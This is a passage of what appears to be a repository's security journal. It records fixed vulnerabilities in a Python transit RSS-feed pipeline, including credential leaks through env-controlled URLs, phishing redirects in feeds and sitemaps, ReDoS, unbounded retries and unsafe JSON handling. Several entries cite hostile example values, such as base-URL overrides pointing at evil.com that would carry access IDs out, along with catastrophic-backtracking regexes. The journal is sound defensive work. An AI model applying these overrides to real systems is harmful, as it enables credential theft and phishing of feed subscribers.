**Vulnerability:** The 2026-05-07 cap added `MAX_TIMEOUT_S = 25.0` in `GooglePlacesConfig.__post_init__` to truncate oversized `REQUEST_TIMEOUT_S` env overrides. The sibling field `max_retries` (read from `REQUEST_MAX_RETRIES` by the SAME three scripts — `fetch_google_places_stations.py`, `verify_google_places_access.py`, `update_station_directory.py` — via `int(env.get("REQUEST_MAX_RETRIES", "4"))` / `_parse_int(...)` with no upper bound) had NO equivalent cap. `GooglePlacesClient._post()` consumes it as `while attempt <= self._config.max_retries:` and (a) sleeps via `_backoff(attempt)` capped at 60s/attempt between retries, and (b) debits the Places quota on EVERY attempt via `_record_successful_request` (Google bills per request, not per success — see `tests/places/test_client_quota_retries.py`). An override `REQUEST_MAX_RETRIES=99999` would therefore stall the cron pipeline for ~98 days per stuck request and burn the entire monthly Places free-tier quota in a single botched run before the per-call quota cap kicks in.
**Learning:** The 2026-05-07 "Slowloris cap belongs at the consumer" learning was applied to `timeout_s` but not generalised to *every* env-derived field on the same dataclass. `GooglePlacesConfig` has TWO fields that fan out from env via the same three scripts (`timeout_s` / `REQUEST_TIMEOUT_S`, `max_retries` / `REQUEST_MAX_RETRIES`); only one got the cap. The pattern to grep is "fields of any `*Config` dataclass populated by `int(env.get(...))` / `float(env.get(...))` / `_parse_int(...)` / `_parse_float(...)` calls", not just the timeout-shaped one. Any dataclass field that gates a retry loop, a sleep budget, or a quota-billing counter is in scope — `max_retries` gates all three at once, which is why its blast radius is actually *worse* than `timeout_s` (multiplicative across attempts, not just additive).
**Prevention:** When a dataclass receives the consumer-layer cap for one env-derived field, audit every other `int`/`float` field on the same dataclass for the same drift. Grep `<X>Config(\s*$` (multi-line constructor calls) and inspect each keyword argument's source — if it's `env.get`/`os.getenv` without a cap and the field controls a retry loop / sleep budget / quota debit, add it to the same `__post_init__` block. For `GooglePlacesConfig` the cap is intentionally generous (10 ≫ default 4) so operators can absorb transient upstream blips without the env override mechanism becoming a single-line DoS vector.

## 2026-05-07 - Provider Base URL Doubles as Auth-Injection Gate
**Vulnerability:** `src/providers/vor.py:refresh_base_configuration` validated `VOR_BASE_URL` / `VOR_BASE` (and the legacy `VAO_BASE` aliases via `VOR_BASE`) only with `validate_http_url(...)` — SSRF/DNS-rebinding properties, not host identity. The catch is that `VOR_BASE_URL` is *also* the prefix that `VorAuth.__call__` matches via `r.url.startswith(self.base_url)` to decide whether to attach the VAO `accessId` query parameter and the `Authorization: Bearer/Basic <VOR_ACCESS_ID>` header. So an env override `VOR_BASE_URL=https://evil.com/api/` (a) redirected every `f"{VOR_BASE_URL}location.name"` / `departureBoard` fetch to the attacker, and (b) made `VorAuth` happily inject the access ID into each of those requests because `https://evil.com/api/...`.startswith(`https://evil.com/api/`) is tautologically true. Same blast radius as the 2026-05-06 GitHub API URL leak, but a different injection vector: a session-level `AuthBase` whose membership predicate is "URL prefix equals the env-controlled value", so the predicate self-validates against any attacker-supplied prefix.
**Learning:** The previous credential-leak fixes (`_is_trusted_github_api`, `_validated_baustellen_data_url`) targeted env vars whose value was *the request URL itself* or the *request host*. This one is a different shape: the env var is the *prefix* of every credentialed request URL, AND the same prefix is the trust boundary used by the auth handler. The audit grep `\.headers\.update\|session\.headers\["Authorization"\]` from the GitHub-API-URL prevention rule misses it entirely — credentials are attached via `session.auth = VorAuth(...)`, not via `session.headers`. The right grep is `session\.auth =\|AuthBase\|requests\.auth`, paired with any env-controlled string used as the comparison input.
**Prevention:** When a custom `AuthBase` (or `requests.auth.HTTPBasicAuth`-style class) gates credential injection on an env-controlled URL prefix, host-pin the prefix the same way fixed credential targets are pinned. Add a `_VOR_TRUSTED_HOSTS` frozenset and a `_validated_vor_base_url(raw)` helper that runs `validate_http_url` *and* checks the host before letting the value land in the global. Grep `class \w+\(AuthBase\)\|session\.auth = ` for sites where this shape applies; in this repo `VorAuth` was the only one, but the pattern recurs in every project that sends credentials to a configurable upstream. Tests that asserted the old loose contract (e.g. `tests/test_vor_env.py:test_base_url_prefers_secret` accepting `https://example.com/base`) must flip to the trusted host; an additional regression test for the rejected case (override to a non-trusted host falls back to the default) keeps future readers honest.

## 2026-05-07 - Phishing-Redirect Drift Round 2: Sitemap `SITE_BASE_URL` Was the Third Publishing Surface
**Vulnerability:** The earlier 2026-05-07 fix added a host pin (`_validated_feed_public_url`) for `FEED_LINK` and `PAGES_BASE_URL` in `src/feed/config.py` — both interpolated into the published RSS feed and atom hrefs. But `SITE_BASE_URL` in `scripts/generate_sitemap.py:_is_valid_base_url` was a third env-controlled URL that lands in the *equally public* sitemap.xml (every `<loc>` element) and in `docs/robots.txt`'s `Sitemap:` directive. Its only validation was `validate_http_url(candidate, check_dns=False)` — no host identity. An env override (`SITE_BASE_URL=https://evil.com/base`) replaced every URL in the sitemap with the attacker's host; search engines that crawl GitHub Pages would treat the attacker URLs as canonical for the site, redirecting every search-result click to a phishing destination. The fix promotes the helper to `src/utils/http.py:validate_public_feed_url` and shares it across `feed/config.py` and the sitemap script.
**Learning:** The previous entry's prevention (`Put the helper at the consumer (one _validated_feed_public_url shared by both FEED_LINK and PAGES_BASE_URL) so a future third feed-output URL inherits the pin without anyone having to remember to add it`) was *correct in spirit* but the helper was scoped *module-locally* to `src/feed/config.py`. The third publishing surface (sitemap script) lived in `scripts/`, never imported `feed/config.py`, and couldn't inherit the pin. The drift is the SAME drift as the previous "cross-tree drift" entry (`src/` vs `scripts/`): a pin that lives in `src/feed/` is invisible to readers/auditors in `scripts/`, and the sitemap script duplicated the entire URL-validation comment block while silently lacking the host-pin half of it.
**Prevention:** When the publishing-surface threat shape applies to multiple modules (one in `src/`, one in `scripts/`), put the pin helper in a *shared utility* module that both can import — `src/utils/http.py` is the natural home next to `validate_http_url` and is already loaded via the existing `try: from src.utils.http import …` fallback pattern in scripts. Grep `\.text =\|\.set\("href"\|<loc>\|Sitemap:` paired with any env-controlled string to enumerate publishing surfaces; sitemap and robots.txt are equally indexed by search engines and have the same blast radius as the RSS feed for SEO-redirect attacks. When updating tests for a tightened helper, also audit *non-security* tests that asserted the old, looser contract (e.g. `tests/test_sitemap_generation.py` had `SITE_BASE_URL=https://example.com/base` in a structural test) — those silently miss the regression unless they're flipped to the tighter contract.

## 2026-05-07 - Phishing-Redirect Drift: Provider URL Pin Not Applied to Feed-Output URLs
**Vulnerability:** The 2026-05-06 fix added host pins (`_validated_oebb_url`, `_WL_TRUSTED_HOSTS`, `_validated_baustellen_data_url`) for env-controlled provider *fetch* URLs that ended up in the public RSS feed as per-item `<link>` fallbacks. But the *same threat shape* applied to `FEED_LINK` (channel `<link>` + per-item `<link>` fallback) and `PAGES_BASE_URL` (atom self/alternate hrefs) in `src/feed/config.py:_load_from_env`, where the only validation was `validate_http_url(raw_feed_link)` — SSRF/DNS-rebinding only, no host identity. An env override (`FEED_LINK=https://evil.com`, `PAGES_BASE_URL=https://attacker.example`) put the attacker host into every channel link AND into every per-item link fallback (line 1324 in `build_feed.py`) AND into the atom self/alternate elements. The resulting feed turns into a phishing-redirect amplifier for *every subscriber* — the blast radius is identical to the WL/ÖBB fix, but the env vars sit in `feed/config.py`, one tree away from the provider modules where the previous audit landed.
**Learning:** Provider URL pins are necessary but not sufficient. The audit pattern from 2026-05-06 ("trace every env-controlled URL all the way to the *output*, not just the request") only caught the request-side env vars (`WL_RSS_URL`, `OEBB_RSS_URL`, `BAUSTELLEN_DATA_URL`); it missed the env vars that go *directly* into the output without ever being fetched. `FEED_LINK` and `PAGES_BASE_URL` are pure *display* values — they're never the target of an HTTP request — so a "this URL is fetched somewhere" search misses them entirely. The drift is "audit scope drift": the previous fix-set targeted "URLs the project fetches" but the threat model is "URLs the project publishes".
**Prevention:** When adding a host pin for one env-controlled URL, also enumerate *every* env var whose value is interpolated into the feed XML (or any other public artefact) without being fetched first. Grep `os.getenv\(.*URL\|os.getenv\(.*LINK\|os.getenv\(.*BASE` and check which ones land in `ET.SubElement(...).text` or `atom_*.set("href", ...)`. Forks need flexibility, so the pin shape for these is broader than the single-host provider pins: allow `github.com` (canonical repo) and `*.github.io` (Pages subdomain), reject everything else. Put the helper at the consumer (one `_validated_feed_public_url` shared by both `FEED_LINK` and `PAGES_BASE_URL`) so a future third feed-output URL inherits the pin without anyone having to remember to add it.

## 2026-05-07 - Cross-Script Drift Round 2: The Third Reader Was in `src/`, Not `scripts/`
**Vulnerability:** The earlier 2026-05-07 audit identified two loaders of `data/vor-haltestellen.mapping.json` (in `scripts/update_station_directory.py` and `scripts/enrich_station_aliases.py`) and pinned a shape guard on both. It missed a *third* loader: `src/providers/vor.py:_load_station_name_map`, which ran `for entry in data:` with no `isinstance(data, list)` check. Worse than its siblings, this one is invoked at **module-import time** via `STATION_NAME_MAP = _load_station_name_map()` at module scope, so a non-list JSON payload (null/int/bool) raises `TypeError` during `import src.providers.vor` — taking down the whole VOR provider and the feed-build pipeline that imports it, *before* any of the documented fallback paths run. The recommended grep `Path("<filename>")\|"<filename>"` from the previous journal entry would have caught it because `vor-haltestellen.mapping.json` is the literal default of `MAPPING_FILE` in `src/providers/vor.py:342`, but the actual audit appears to have grepped only `scripts/`.
**Learning:** "Cross-script drift" understates the problem — the drift is "cross-tree": producer and primary consumers in `scripts/`, additional consumers in `src/`. Grep scoped to one tree silently misses the other. Also, the import-time call site escalates blast radius from "one cron job aborts" (`scripts/`) to "every CLI/feed entry-point fails to import the provider" (`src/`), which is harder to detect because the failure happens in early initialisation and surfaces as `ImportError` rather than the loader's own logged-and-fallback path.
**Prevention:** When extending a Zero-Trust shape-guard fix to sibling readers of a shared file format, grep the *whole repo* for the on-disk filename and the path-constant identifier — not just `scripts/`. The pattern this turn should be: `git grep -nE 'vor-haltestellen\.mapping\.json|MAPPING_FILE|VOR_STATION_NAME_MAP'`. Also, *module-level* invocation of a loader (`X = _load_thing()` at import scope) is a separate red flag — if the function reads from disk and lacks shape guards, a corrupted file becomes an import-time crash. Grep `^[A-Z_]+ = _load_` or `^[A-Z_]+ = json\.loads\(` at column 0 in `src/` to enumerate them.

## 2026-05-07 - Cross-Script Drift: Same JSON File, Two Loaders, Only One Has the Shape Guard
**Vulnerability:** `data/vor-haltestellen.mapping.json` is produced by `scripts/fetch_vor_haltestellen.py` and consumed by **two** loaders in different scripts. `scripts/update_station_directory.py:_load_vor_name_to_id_map` properly checks `isinstance(payload, list)` and `isinstance(name, str)` / `isinstance(vor_id, str)` before use. The sibling `scripts/enrich_station_aliases.py:_load_vor_mapping` did *neither* — it ran `for item in payload:` (TypeError on null/int/bool payloads) and `(item.get("resolved_name") or "").strip()` (AttributeError on truthy non-str values). Both loaders sit inside the `update_all_stations.py` cron pipeline that uses `subprocess.run(check=True)`, so any unhandled exception in `enrich_station_aliases.py` raises `CalledProcessError` and aborts the entire station-directory refresh. The same script's own `_load_pendler_alternative_names` already used the correct `isinstance(data, Mapping)` / `isinstance(raw, list)` pattern — so the drift was *intra-script* as well as *cross-script*.
**Learning:** The 2026-05-07 audit pattern ("grep `scripts/` for `\.json()` and `json\.loads(` followed by `\.get(` without an intervening isinstance guard") catches the *parse → access* shape, but not the *parse → for-loop* shape. `for x in payload` is just as dangerous — TypeError on non-iterable is identical in blast radius to AttributeError on non-Mapping, and both bypass the documented `return {}` fallback. Also, a single producer + two consumer functions is a recurring drift pattern: when a Zero-Trust shape guard is added to one consumer of a shared file format, grep for *every other reader* of the same path / filename, not just other call sites in the current script.
**Prevention:** Extend the Zero-Trust audit grep to include `for .* in payload\b` / `for .* in data\b` / `for .* in raw\b` immediately after a `json.loads` / `.json()` call. When a fix lands in one loader, also grep `Path("<filename>")\|"<filename>"` (or the constant identifier, e.g. `DEFAULT_VOR_MAPPING`) across the repo to enumerate sibling consumers — they share the same shape contract and should share the same guard, ideally factored into a `_require_json_list(raw)` / `_require_json_object(raw)` helper if more than two loaders converge on the same file.

## 2026-05-07 - Slowloris Cap Belongs at the Consumer, Not Per-Script, for Shared Env Vars
**Vulnerability:** `REQUEST_TIMEOUT_S` is read directly into `GooglePlacesConfig.timeout_s` by *three* scripts — `scripts/fetch_google_places_stations.py`, `scripts/verify_google_places_access.py`, and `scripts/update_station_directory.py` — all using `float(env.get("REQUEST_TIMEOUT_S", "25"))` (or its `_parse_float` equivalent) with no upper bound. `timeout_s` is then passed straight into `_post()` as both the connect and read budget, including the `read_response_safe` deadline. A benign-looking override such as `REQUEST_TIMEOUT_S=99999` (intentional misconfig, leaked CI env, compromised secret store) silently disables the per-request Slowloris defence and lets a sluggish or attacker-controlled upstream peer hold the Places refresh job for ~28 hours, stalling the whole cron pipeline.
**Learning:** The 2026-05-06 `VOR_HTTP_TIMEOUT` fix capped a *single* env var read at *one* call site (`min(_load_int_env(...), DEFAULT)`). That pattern doesn't scale when the same env var fans out across multiple scripts: per-script `min()` calls would be three separate fixes that can drift apart. The right layer for the cap is the *consumer* — here, `GooglePlacesConfig.__post_init__` — so the ceiling is enforced regardless of which script populated the dataclass. This is also defense-in-depth: a future fourth caller automatically inherits the cap without anyone having to remember to add it.
**Prevention:** When an env var is consumed via a dataclass that's instantiated from N call sites, put the cap in the dataclass's `__post_init__` (use `object.__setattr__` for frozen dataclasses) and document the Slowloris/quota/contract reason at the constant declaration. Grep `GooglePlacesConfig(\|VORConfig(\|<X>Config(` paired with `os.getenv\|env.get\|env\[` to enumerate fan-out env reads where this consumer-layer cap is the right shape.

## 2026-05-07 - Zero-Trust Gap in Sibling VAO mgate Resolver Drops Whole Batch
**Vulnerability:** `scripts/fetch_vor_haltestellen.py:fetch_candidates` called `resp.json()` followed immediately by `data.get("svcResL")` with no shape guard. The 2026-05-06 journal entry already fixed exactly this pattern in the *sibling* script `scripts/update_vor_stations.py` for the VAO `location.name` endpoint, but the audit stopped there — the *other* VAO endpoint (mgate / HAFAS) wired through `fetch_candidates` retained the gap. A non-dict JSON body (list, scalar, null, bool) from a misbehaving / compromised upstream proxy raised `AttributeError`, which is **not** a `requests.RequestException` — so `resolve_station`'s `except requests.RequestException` did not catch it, the error propagated out of the per-station loop in `main()`, and every subsequent station was silently skipped. The CSV / mapping outputs would then ship to the next `update_all_stations.py` pass as a partial result with no signal that the batch was truncated.
**Learning:** Per-iteration Zero-Trust failures in scripts that fan out across many stations have an outsized blast radius compared to the same gap in a single-call function. The previous fix's *learning* ("route shape failures through the same fallback branch as decode failures") was journaled but the *audit* didn't grep for sibling `response.json()` / `resp.json()` call sites in the same script directory. Any script in `scripts/` that loops over IDs and calls a HAFAS-shaped endpoint is a candidate — there are at least two such endpoints (location.name, mgate) and the audit must walk both.
**Prevention:** When a Zero-Trust fix lands in a `scripts/update_*.py` per-ID loop, immediately grep `scripts/` for *all* `\.json()` and `json\.loads(` followed by `\.get(` (without an intervening `isinstance.*(Mapping|dict)` line) and check whether each call site sits inside another fan-out loop. If so, mirror the existing fallback branch's structure verbatim — `try/except ValueError` for decode, `isinstance(data, Mapping)` for shape, both routed to the same `return []` / `continue` so the loop keeps iterating.

## 2026-05-07 - Zero-Trust Gap in Tile Loader Sibling to Already-Fixed Places Client
**Vulnerability:** `src/places/tiling.py:_parse_tiles` accepted `Iterable[Mapping[str, object]]` and called `raw.get("lat")` directly, while both call sites (`load_tiles_from_env`, `load_tiles_from_file`) handed it `cast(Iterable[Mapping[str, object]], data)` after `json.loads`. The outer `isinstance(data, list)` check verifies the *container* is a list, but not that each *element* is a Mapping. A `PLACES_TILES='[1, 2, 3]'`, `'[null]'`, `'["str"]'`, or `'[[48.2,16.3]]'` env override (misconfig, leaked CI env, compromised secret store) — or a tampered tile JSON file — passed the outer guard and crashed inside `_coerce_coordinate` with `AttributeError: '<type>' object has no attribute 'get'` instead of the documented `ValueError`. Same module sat next to `places/client.py`, which the 2026-05-05 journal entry already fixed for the analogous `cast(Dict, …)` after `_post`.
**Learning:** When the previous Zero-Trust audit fixed the *dict-shaped* boundary in `places/client.py`, it didn't generalise to the *list-of-dicts*-shaped boundary in the same package. The `cast(Iterable[Mapping…], json.loads(…))` pattern is materially different from `cast(Dict, json.loads(…))`: the outer `isinstance(data, list)` looks like enough validation, so reviewers (and grep patterns targeting `cast(.*Dict`) skip past it. The tell is *element*-level `.get()` (or any other Mapping-only method) called on a loop variable whose container was checked but whose elements were not.
**Prevention:** Extend the cast-adjacent-to-JSON grep to include `cast(.*Iterable.*Mapping\|cast(.*list.*Mapping\|cast(.*Sequence.*Mapping` — anywhere a JSON list is fed into a function whose parameter type promises Mapping elements. The fix shape is always the same: drop the lying `cast`, weaken the parameter type to `Iterable[object]`, and add the per-element `isinstance(raw, Mapping)` guard inside the loop so the failure mode matches the existing `ValueError` contract callers expect.

## 2026-05-06 - Env-Controlled Regex Compiles Without ReDoS Heuristic
**Vulnerability:** `src/providers/vor.py:_compile_regex` read `VOR_BUS_INCLUDE_REGEX` / `VOR_BUS_EXCLUDE_REGEX` from the environment, validated only `re.error` (i.e. *syntax*), and returned the compiled pattern. A pattern with classic catastrophic backtracking (`(a+)+$`, `(.*)*`, `(a?)+`) compiles cleanly but pegs CPU at 100 % during the per-token `match` / `search` loop in `_extract_bus_lines`. Because the regex is reapplied to every bus-line token of every VOR product on every feed build, a single misconfig (operator typo, leaked CI env, compromised secret store) silently turns the build into a DoS against itself. The codebase already had a ReDoS test for the *hardcoded* `LINES_COMPLEX_PREFIX_RE` in `wl_lines.py` but no equivalent guard for the *operator-supplied* patterns in `vor.py`.
**Learning:** Env-controlled regexes are a different threat shape from env-controlled URLs / paths / ints — `validate_http_url`, `validate_path`, and `min(..., DEFAULT)` don't apply, so the existing toolkit doesn't cover them. ReDoS detection in pure Python is hard (no native regex timeout), so the practical defense is two cheap layers before `re.compile`: (a) a length cap on the pattern itself (oversized input risks memory exhaustion during compile), and (b) a static-string heuristic that rejects nested unbounded quantifiers around groups (`[+*?]\s*\)\s*[+*]`, tolerating whitespace). The heuristic is intentionally conservative — alternation-overlap ReDoS like `(a|aa)+` slips through — but it covers the patterns historically responsible for real outages and falls back to vetted defaults whenever it fires.
**Prevention:** Whenever a future env var is plumbed into `re.compile(...)`, mirror the `_compile_regex` pattern: cap the input length, scan with `_REDOS_NESTED_QUANTIFIER_RE`, then `try/except re.error`. Add a sanity test asserting that the project's own *defaults* are not flagged by the heuristic — otherwise the fallback path is unreachable and the next operator override silently bypasses the guard. Grep for `re.compile(.*os.getenv` / `re.compile(.*os.environ` to enumerate any new instances of this pattern.

## 2026-05-06 - Env-Override Disables Hard Contract Cap on VOR Quota
**Vulnerability:** `src/providers/vor.py:MAX_REQUESTS_PER_DAY = _load_int_env("VOR_MAX_REQUESTS_PER_DAY", DEFAULT_MAX_REQUESTS_PER_DAY)` accepted any positive integer. `_load_int_env` only enforces `value > 0`, so `VOR_MAX_REQUESTS_PER_DAY=99999` (intentional misconfig, leaked CI env, or compromised secret store) raised the daily-quota gate above the *contractual* hard cap of 100/day for the VAO Start tier. The constant is read at 8+ sites in `vor.py` and again by `_limit_reached` in `scripts/update_vor_cache.py`; every gate would silently approve requests beyond the cap, risking access-ID suspension by the upstream provider.
**Learning:** Default values are not equivalent to *upper bounds* when the constant encodes a third-party contractual limit. The pattern `MAX_REQUESTS_PER_DAY = _load_int_env("…", DEFAULT)` reads as "default 100, configurable", not "ceiling 100, can only tighten" — but the latter is the security-correct semantics for any quota that has external consequences (rate limits, billing, contract clauses). The same pattern likely applies elsewhere in the codebase (`HTTP_TIMEOUT` for Slowloris, `VOR_MAX_STATIONS_PER_RUN` for fan-out) and should be audited the next time those constants are touched.
**Prevention:** When an integer env var feeds an external-contract or DoS-relevant constant, wrap the `_load_int_env(...)` call in `min(..., DEFAULT)` (or a documented `MAX_*` ceiling) so the env var can only *tighten* the value. Add a security comment at the call site naming the contract clause and the consequence of bypass — future readers must understand the env var is intentionally *not* "set this to whatever you want".

## 2026-05-06 - `except ValueError` Misleadingly Hides Zero-Trust Gap
**Vulnerability:** `src/feed/reporting.py:_submit_github_issue` had `detail = response.json().get("message", response.text)` and `data = response.json(); issue_url = data.get("html_url")`, both wrapped in `except ValueError`. That `except` clause LOOKS defensive — like it covers JSON parsing failures — but it only catches JSON *decode* errors. A successfully-decoded but non-dict body (list/scalar/null from a misbehaving GHE proxy or unexpected upstream change) would propagate `AttributeError: 'list' object has no attribute 'get'` upward, breaking the feed-build flow at the very moment we're trying to *report* a feed-build error.
**Learning:** The previous Zero-Trust journal entries (`places/client.py`, `wl_fetch.py`, `vor.py`) all featured a *missing* `try/except` around `json.loads` — easy to grep for. This one was harder to spot because the `try/except ValueError` is already there; it just doesn't cover the failure mode that matters. The prevention rule ("grep for `json.loads` and `.json()`") only works if you also inspect what's chained after the parse — `.json().get(...)` or `.get(...)` on a `data = response.json()` result, even inside a try/except.
**Prevention:** When auditing JSON parsing sites, the *real* signal is `.get(...)` (or any other dict-only method) used directly on the parse result. Grep `\.json\(\)\.get\|json\.loads\(.*\)\.get` to enumerate them. An `except ValueError` is not equivalent to an `isinstance(payload, dict)` guard — they cover orthogonal failure modes (decode vs shape). Add the isinstance check **inside** the else-branch of the try/except so both are enforced.

## 2026-05-06 - Provider URL Env Vars Weaponise the Public Feed
**Vulnerability:** `WL_RSS_URL` (Wiener Linien) and `OEBB_RSS_URL` (ÖBB) were validated only with `validate_http_url()`, which checks SSRF/DNS-rebinding properties but not host identity. An env override to `https://evil.com` would (a) feed attacker-controlled JSON/XML straight into the cached items, and (b) place the attacker URL into every WL item's `<link>` element (and into the per-item ÖBB `<link>` fallback). The downstream RSS feed is public, so this turns the project into a phishing/redirect amplifier — anyone subscribed to the feed clicks through to the attacker.
**Learning:** "No credentials sent to this URL" doesn't mean an env-controlled URL is safe. When a fetched URL becomes part of the *output*, the host pin is just as important as it is for credential targets. The specific vector that escalated this from "content injection" to "phishing primitive" was reading the env URL straight back into the feed item `<link>`, which I almost missed because I was thinking about the HTTP request side, not the XML output side.
**Prevention:** Trace every env-controlled URL all the way to the *output*, not just the request. If the URL is interpolated into a public artefact (RSS link, sitemap, generated HTML), pin it to the official upstream host with a frozenset allowlist. Both providers used a tiny inline `_validated_X_url(raw)` helper that mirrors `_is_trusted_github_api` in shape, so the same pattern is reusable for any future external endpoint.

## 2026-05-06 - URL Path Injection via Repository Slug
**Vulnerability:** After PR #1258 pinned the GitHub auto-issue reporter to a known host, `FEED_GITHUB_REPOSITORY` (or `GITHUB_REPOSITORY`) was still interpolated raw into `f"{api_url}/repos/{repo}/issues"`. A slug like `owner/repo?injected=1`, `owner/../organizations`, or `owner/repo#frag` rewrote the URL to a *different* GitHub endpoint — still authorised by the token — letting an env-var override redirect the auto-issue post to an arbitrary repo or API surface (issue spam, repo enumeration, mistaken targets).
**Learning:** Pinning the host is necessary but not sufficient when subsequent path components are also env-controlled. Each segment that goes into a request URL needs its own grammar check matching the upstream service's documented format. GitHub's repo slug grammar (1–39 alphanumeric/hyphen owner, no leading hyphen; 1–100 alphanumeric/hyphen/underscore/dot name) is well-defined and trivial to enforce — the gap was that nobody enforced it.
**Prevention:** Every env-controlled value that is interpolated into a request URL must pass a grammar check **before** the URL is built. Use anchored `re.fullmatch` (or `\A...\Z`) so suffix injection (`owner/repo?leak=1`, `owner/repo/extra`) cannot slip through with a partial match. Validate at request time, not just at config time, so the check runs on the value actually used.

## 2026-05-06 - GitHub Token Leak via Env-Controlled API URL
**Vulnerability:** `src/feed/reporting.py` read `FEED_GITHUB_API_URL` (and `GITHUB_API_URL`) directly from the environment and only ran `validate_http_url()` on the constructed `{api_url}/repos/{repo}/issues` endpoint. `validate_http_url()` checks SSRF/DNS-rebinding properties (no localhost, public IP, allowed port, …) but *not* host identity — so any syntactically valid public host (e.g. `https://evil.example.com`, or a typosquat like `api.gihub.com`) would pass and the `Authorization: Bearer ghs_…` header was attached by the next line. Effectively a one-shot token exfiltration primitive whenever an attacker (or a misconfiguration) controlled that env var.
**Learning:** SSRF guards and host-identity guards solve different problems. `validate_http_url()` is designed to keep the request from hitting *internal* infrastructure; it is intentionally not opinionated about which *external* host you talk to. When sending a credential to a third-party API, you need a **separate** allowlist check on the API hostname, applied **before** any token attachment. The default `https://api.github.com` was so well-known it lulled callers into trusting the implicit allowlist, but the env override silently disabled it.
**Prevention:** Any code that attaches a credential to an outbound request must validate the request hostname against a service-specific allowlist (`api.github.com` exact, plus `/api/v3` or `/api/graphql` paths for GitHub Enterprise Server) **before** `session.headers.update(...)` or equivalent. When the token's issuer is known (e.g. `ghs_*` from GitHub Actions), bake the trusted host pattern into the same module that reads the token.

## 2026-05-06 - Path Containment Drift in Update Scripts
**Vulnerability:** `scripts/update_baustellen_cache.py` read `BAUSTELLEN_FALLBACK_PATH` from the environment, called `Path(...).resolve()` (which **follows symlinks**), and read the file as JSON without any containment check. An attacker controlling that env var could point the script at arbitrary on-disk JSON-shaped files, whose content would then be merged into the feed cache. Symlinks inside `data/` made even an "in-repo" allowlist insufficient if it relied on the original path string.
**Learning:** The codebase already had `_resolve_path()` in `src/providers/vor.py` and `validate_path()` in `src/feed/config.py` for exactly this purpose, but the pattern hadn't been propagated to every script that reads paths from env. `Path.resolve()` is **not** a containment check — it actively *escapes* containment by following symlinks. Any containment check must therefore happen *after* `resolve()`, comparing the resolved path's `relative_to(BASE)` membership.
**Prevention:** When a script reads a file path from an env var or CLI arg, always (1) `resolve()` first to canonicalise, then (2) `relative_to(REPO_ROOT)` (or a more specific allow-root) to enforce containment, and (3) fall back to a known-good default on rejection. Grep for `os.getenv.*PATH\|os.getenv.*FILE` paired with `Path(...).resolve()` to find new instances of this pattern.

## 2026-05-06 - .env Files Inherit Umask Permissions
**Vulnerability:** `scripts/configure_feed.py` wrote the `.env` file via `Path.write_text()`, which respects the process umask. With the typical 0o022 umask the file landed at 0o644 — so `VOR_ACCESS_ID` and any other custom secrets were group/world-readable on shared systems. Worse, re-running the wizard on an existing 0o644 file kept those loose permissions because `write_text` does not change permissions on overwrite.
**Learning:** The codebase already had `atomic_write(..., permissions=0o600)` for caches in `src/utils/files.py`, but the wizard — the canonical entry point that *creates* secrets — was the one place that bypassed it. Files holding secrets must be *created* with restrictive permissions (via `os.open(..., 0o600)` or `atomic_write`), not just chmod'd later, because there is always a race window where another process can read them.
**Prevention:** Any code that writes a file containing credentials must go through `atomic_write` with `permissions=0o600`. Grep for `write_text\|write_bytes` in scripts/ when adding a new credential-handling flow; if the path is `.env`, a credentials file, or a token cache, the call must use atomic_write instead.

## 2025-02-12 - Custom .env Parsing Pitfalls
**Vulnerability:** Incomplete escaping logic in custom `.env` parser allowing secrets with quotes to be corrupted.
**Learning:** Reimplementing standard formats (like shell variable assignment) often misses edge cases like escaped quotes.
**Prevention:** Prefer established libraries (e.g., `python-dotenv`) or rigorous testing of edge cases when implementing low-level parsers.

## 2026-02-02 - Redundant Query Parameter Injection
**Vulnerability:** The VOR provider manually injected `accessId` into query parameters even when `apply_authentication` was configured to use Headers, leading to potential secret leakage in URLs.
**Learning:** Manual overrides in specific API calls can bypass centralized security logic (like `apply_authentication`).
**Prevention:** Rely on centralized authentication handlers (middlewares/hooks) and avoid manual credential injection in individual request functions.

## 2026-02-14 - SSRF TOCTOU via Error Oracle
**Vulnerability:** `fetch_content_safe` checked `raise_for_status()` before verifying the connected IP, allowing attackers to probe internal networks by observing error codes (e.g. 404 vs connection refused) even if the IP was blocked.
**Learning:** Security checks on the response object (like IP verification) must happen *before* any data (including status codes) is processed or returned to the caller.
**Prevention:** Enforce a strict "Verify-Then-Process" order for all network response handling.

## 2026-02-15 - Unbounded Redirects & Infrastructure TLDs
**Vulnerability:** The HTTP client used the default limit of 30 redirects, which exposes the application to resource exhaustion (DoS) via redirect loops. Additionally, infrastructure TLDs (.arpa, .kubernetes) were not blocked, potentially allowing SSRF against internal cluster services.
**Learning:** Default settings in libraries (like requests) often prioritize usability/compatibility over security.
**Prevention:** Explicitly configure limits (e.g., max_redirects) and maintain a comprehensive blocklist of internal/infrastructure TLDs for SSRF protection.

## 2025-10-26 - Sensitive Headers Leak on Cross-Origin Redirects
**Vulnerability:** Custom sensitive headers (e.g., `X-Goog-Api-Key`, `Private-Token`) were persisted by `requests` when following redirects to different domains, potentially leaking credentials to third-party servers.
**Learning:** `requests` only strips the `Authorization` header automatically on cross-origin redirects. Custom headers are preserved by default.
**Prevention:** Override `requests.Session.rebuild_auth` to explicitly strip a defined list of sensitive headers when the hostname changes during a redirect.

## 2026-03-01 - Partial Log Redaction on Quoted Secrets
**Vulnerability:** The regex used for masking sensitive query parameters (`key=value`) eagerly stopped at the first space, failing to mask the full value if it was a quoted string containing spaces (e.g. `token="secret value"` -> `token=*** value"`).
**Learning:** Simple regex exclusions like `[^&\s]+` are insufficient for formats that support quoting or escaping.
**Prevention:** Explicitly match and consume quoted strings (`"[^"]*"` or `'[^']*'`) *before* falling back to generic token matching in sanitization logic.

## 2026-03-02 - Token Scanning Misses Spaced Secrets
**Vulnerability:** The secret scanner's regex enforced strictly contiguous alphanumeric characters, causing it to miss valid secrets containing spaces (e.g. passphrases) or symbols, even when quoted.
**Learning:** Security tools that assume specific formats for secrets (like Base64) can create blind spots for other valid patterns (like natural language passphrases).
**Prevention:** When scanning for secrets, support broad value capture (e.g. any quoted string) and rely on secondary entropy/complexity checks rather than strict regex pattern matching.

## 2026-03-03 - Strict Category Checks Miss Low-Case Passphrases
**Vulnerability:** The secret scanner required at least two of {Upper, Lower, Digit}, causing it to miss long, high-entropy passphrases that were all-lowercase with spaces or symbols.
**Learning:** Complexity rules (like "must have upper and digit") designed for password policies are often too strict for secret scanning, where "context" (assignment to `PASSWORD`) implies high probability of a secret.
**Prevention:** When scanning high-confidence contexts (assignments), relax complexity checks or treat symbols/spaces as valid entropy categories.

## 2026-03-04 - Incomplete Secret Masking for Cloud Providers
